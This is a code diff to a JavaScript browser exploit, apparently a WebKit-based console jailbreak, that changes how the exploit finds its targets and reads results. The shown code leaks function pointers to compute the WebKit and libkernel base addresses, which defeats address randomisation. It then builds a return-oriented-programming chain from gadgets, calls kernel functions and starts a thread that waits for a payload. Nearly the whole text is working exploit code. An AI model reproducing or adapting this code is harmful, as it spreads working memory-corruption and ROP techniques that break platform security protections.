@@ -65,10 +65,10 @@
         return smashBase.add32(0x20);
       }
 
-      var funcPointer = p.read8(p.leakFunction(parseFloat));
+      var parseFloatPointer = p.read8(p.leakFunction(parseFloat));
 
       /* Calculate slide */
-      var webkitBase = funcPointer.add32(0); // copy
+      var webkitBase = parseFloatPointer.add32(0); // copy
       webkitBase.low &= ~0xFFF;
       webkitBase.sub32inplace(0x55000);
 
@@ -98,9 +98,8 @@
         however since we may require libkernel's address for some gadgets in the future
         anyway, it's better to do it qwerty's way by leaking the stack_chk_fail import pointer.
       */
-      var libkernel = p.read8(window.basicImports['__stack_chk_fail']);
-      libkernel.low &= ~0xFFF;
-      libkernel.sub32inplace(0x51000);
+      var libkernel = p.read8(window.basicImports['__stack_chk_fail_ptr']);
+      libkernel.sub32inplace(window.basicImports['__stack_chk_fail_offset']);
 
       moduleBaseAddresses['libkernel']  = libkernel;
 
@@ -231,14 +230,14 @@
         chain.call(rip, rdi, rsi, rdx, rcx, r8, r9);
 
         chain.push(window.gadgets["pop rdi"]);
-        chain.push(chain.ropChainPtr.add32(0xfff8));
+        chain.push(chain.ropChainEndPtr.sub32(8));
         chain.push(window.gadgets["mov qword ptr [rdi], rax"]);
         chain.push(window.gadgets["pop rax"]);
         chain.push(p.leakval(0x41414242));
 
         if (chain.run().low != 0x41414242) throw new Error("Unexpected ROP behaviour");
 
-        retVal = p.read8(chain.ropChainPtr.add32(0xfff8));
+        retVal = p.read8(chain.ropChainEndPtr.sub32(8)).add32(0);
 
         /* If this check is true, errno was set and function returned -1 */
         if(retVal.low == 0xFFFFFFFF && retVal.hi == 0xFFFFFFFF)
@@ -631,6 +630,11 @@
           print("scePthreadCreate: 0x" + p.call(libkernel.add32(0x11570), thread, 0, code_addr, 0, thr_name));
           print("thread: 0x" + p.read8(thread));
           print("=== Waiting for payload!!! ===");
+      }
+      else
+      {
+          print("Failed to allocate payload");
+          print(buffer);
       }
     }
   </script>
